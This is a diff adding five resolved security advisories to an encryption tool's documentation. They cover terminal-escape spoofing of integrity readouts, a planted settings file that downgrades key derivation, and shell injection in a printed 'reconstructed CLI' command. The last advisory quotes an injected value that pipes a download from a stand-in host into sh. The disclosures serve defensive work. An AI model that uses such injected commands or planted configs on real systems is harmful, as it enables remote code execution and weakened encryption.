@@ -228,6 +228,81 @@ relevant.
 
 ## Security Advisories
 
+### ADVISORY 2026-30: `verify-usb` Printed Attacker-Planted Filenames Without Escaping — Resolved
+
+**Severity:** Medium · **CWE-117** (Improper Output Neutralization for terminal)
+**Affected versions:** all releases with `verify-usb`, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
+
+**Summary:** the `verify-usb` command's tampered / missing / added file lists are built from raw path names discovered by scanning the untrusted drive — data outside the AES-GCM authenticated manifest — and were echoed under the FAILED banner with no `sanitize_for_display()`. A planted filename containing cursor-movement / erase-line bytes could repaint a forged "PASSED" verdict on the very command whose job is to report tampering. The command's error path also printed the raw exception (which can embed the user-supplied `--usb-path`).
+
+**Impact:** terminal-output spoofing of the integrity verdict for an attacker-controlled drive. No code execution.
+
+**Fixed in 1.4.9 / 1.5.0:** every drive-derived filename, and the error-path exception message, are routed through `sanitize_for_display()`. Regression-pinned by `test_verify_usb_display_sanitization_238.py`.
+
+**Mitigation for existing installs:** upgrade to 1.4.9 / 1.5.0; on earlier versions, do not trust a `verify-usb` PASSED line without inspecting the raw output for embedded control sequences.
+
+**Disclosure:** tracked as gitlab#238 and GHSA-c793-rj9w-r3wg (published with the release). **Credit:** found by the 1.4.9 pre-release security scan (finding F25).
+
+### ADVISORY 2026-29: Decrypt Auto-Detection Printed an Untrusted key_id Unescaped and Parsed the Header Unbounded — Resolved
+
+**Severity:** Medium · **CWE-117** (Improper Output Neutralization for terminal)
+**Affected versions:** all releases with asymmetric decrypt auto-detection, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
+
+**Summary:** `detect_encryption_type` parsed an encrypted file's header with a bare `json.loads` and returned each `asymmetric.recipients[].key_id`; on the "no matching identity" decrypt path these were printed to stderr with no escaping. Literal cursor-movement / erase-line bytes in a crafted `key_id` could scroll back over the error and paint a forged `Fingerprint:` / verification block — the only out-of-band authenticity readout the design offers. The recipient list was also unbounded.
+
+**Impact:** terminal-output spoofing of the authenticity readout when attempting to decrypt an attacker-supplied asymmetric file, plus an unbounded-materialization/print risk from a crafted recipient list. No code execution.
+
+**Fixed in 1.4.9 / 1.5.0:** the printed fingerprint is routed through `sanitize_for_display()`; the recipient list read from the header is capped; and the header is parsed through a size/depth/control-character-bounded JSON security scan before `json.loads` (a rejection is treated as "not detected", a safe default). Regression-pinned by `test_detect_encryption_type_hardening_237.py`.
+
+**Mitigation for existing installs:** upgrade to 1.4.9.
+
+**Disclosure:** tracked as gitlab#237 and GHSA-jwfm-99h7-2w5x (published with the release). **Credit:** found by the 1.4.9 pre-release security scan (finding F3).
+
+### ADVISORY 2026-28: `info` Rendered Untrusted File Metadata Without Escaping Terminal Control Characters — Resolved
+
+**Severity:** Medium · **CWE-117** (Improper Output Neutralization for Logs / terminal)
+**Affected versions:** all releases with the `info` command, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
+
+**Summary:** `print_file_info` (the `info` command) printed metadata fields taken from an untrusted file — `algorithm`, `encryption_data`, `cipher_chain`, `layer_info[].cipher`, `hkdf_hash`, `salt`, the KDF display names and parameters, `original_hash`/`encrypted_hash`, the PQC public key, `hsm_plugin`, `pepper_plugin`, `pepper_name`, and (for crafted legacy v1/v2 files, which skip schema validation) `mode`/`xor_mode`/`encrypted_at` — to the terminal with no `sanitize_for_display()`. The `--json` output likewise used `ensure_ascii=False`. Because the JSON security scan rejects only C0 control bytes, a crafted file could carry C1 (e.g. 0x9B CSI), DEL, or bidi override characters that reached the terminal raw. Cursor-movement / erase-line / bidi bytes in a field let a hostile file repaint the info output — including forging the `Fingerprint:` / verification line — on the command whose purpose is to judge an untrusted file.
+
+**Impact:** terminal-output spoofing when running `info` on an attacker-supplied file: the attacker can rewrite what the tool appears to report about the file, including its authenticity readout. No code execution.
+
+**Fixed in 1.4.9 / 1.5.0:** every metadata-derived value printed by `print_file_info` (including the reconstructed-CLI lines, and the legacy top-level fields) is routed through `sanitize_for_display()`, which escapes C0/C1/DEL and bidi controls; the `--json` branch now uses `ensure_ascii=True`. Regression-pinned by `test_info_file_info_display_sanitization_236.py`.
+
+**Mitigation for existing installs:** upgrade to 1.4.9 / 1.5.0; on earlier versions, do not run `info` on untrusted files in a terminal you rely on for verification.
+
+**Disclosure:** tracked as gitlab#236 and GHSA-539p-fxf4-7fv8 (published with the release). **Credit:** found by the 1.4.9 pre-release security scan (finding F4).
+
+### ADVISORY 2026-27: Legacy GUI Loaded KDF Settings From a CWD-Relative File — Resolved
+
+**Severity:** Medium · **CWE-426** (Untrusted Search Path)
+**Affected versions:** all releases with the legacy Tk settings GUI, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
+
+**Summary:** `crypt_settings.py` defined `CONFIG_FILE` as the absolute per-user path `~/.crypt_settings.json`, but reassigned it a few lines later to the bare relative name `crypt_settings.json`, shadowing it. The legacy Tk GUI's `SettingsTab.load_settings`/`save_settings` therefore read and wrote whatever `crypt_settings.json` file happened to sit in the process's launch directory. A `crypt_settings.json` planted in the working directory (e.g. `sha256: 1` with every memory-hard KDF disabled) silently reduced every file encrypted in that GUI session to roughly one hash round — the weak-KDF preflight did not fire because one hash iteration was present — after which an attacker could brute-force the ciphertext offline.
+
+**Impact:** a key-derivation downgrade to near-zero work factor, reachable by planting a file in a directory the victim launches the legacy GUI from. Confidentiality of everything encrypted that session is lost to offline guessing.
+
+**Fixed in 1.4.9 / 1.5.0:** the shadowing reassignment is removed, so the settings file always resolves to the absolute per-user path regardless of the working directory. `load_settings` additionally warns loudly when the loaded configuration provides no memory-hard/iterated key stretching (no Argon2/scrypt/balloon/RandomX and no significant hash rounds). Regression-pinned by `test_crypt_settings_config_path_235.py`.
+
+**Mitigation for existing installs:** upgrade to 1.4.9 / 1.5.0; on earlier versions, launch the GUI from a trusted directory and verify `~/.crypt_settings.json` is the config in effect.
+
+**Disclosure:** tracked as gitlab#235 and GHSA-7j2v-g84w-m75v (published with the release). **Credit:** found by the 1.4.9 pre-release security scan (finding F34).
+
+### ADVISORY 2026-26: `info` Reconstructed-CLI Block Interpolated Untrusted Metadata Unquoted — Resolved
+
+**Severity:** Medium · **CWE-78** (OS Command Injection via unsafe output)
+**Affected versions:** all releases with the `info` reconstructed-CLI output, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
+
+**Summary:** the `info` command prints a "Reconstructed CLI" block (an `openssl_encrypt encrypt …` command that would reproduce a file's settings), built by `_reconstruct_cli_from_metadata`. It interpolated attacker-controlled metadata fields — `pepper_name`, `hsm_plugin`, `algorithm`, `cipher_chain`, `kdf_config.hkdf.info`, `argon2.type`, `randomx.mode`, and the numeric cost fields — into that shell text with no quoting. A file whose `pepper_name` was, e.g., `work; curl -s http://evil/x | sh #` produced a printed command that executed attacker code the moment the user copied the block into a shell (the block's stated purpose); newline/escape injection in the same output could make the malicious suffix inconspicuous.
+
+**Impact:** command execution on the machine running `info` against an untrusted file — but only after the user pastes the reconstructed command into a shell. It is not executed by the tool itself.
+
+**Fixed in 1.4.9 / 1.5.0:** every value interpolated into the reconstructed command now passes through `shlex.quote()` (via a `_shq()` helper), so a crafted value — including one containing shell metacharacters or embedded newlines — stays a single, inert shell token. Regression-pinned by `test_info_cli_reconstruction_shell_safety_234.py`, which asserts each crafted value survives `shlex.split` as exactly one token.
+
+**Mitigation for existing installs:** upgrade to 1.4.9 / 1.5.0; on earlier versions, do not paste the `info` reconstructed-CLI block for an untrusted file into a shell without inspecting it.
+
+**Disclosure:** tracked as gitlab#234 and GHSA-gw2m-mj6q-59hc (published with the release). **Credit:** found by the 1.4.9 pre-release security scan (finding F35).
+
 ### ADVISORY 2026-25: Pre-Authentication Resource Exhaustion via Unbounded KDF Cost in Crafted Files — Resolved
 
 **Severity:** Medium · **CWE-770** (Allocation of Resources Without Limits) / CWE-405 / CWE-1284
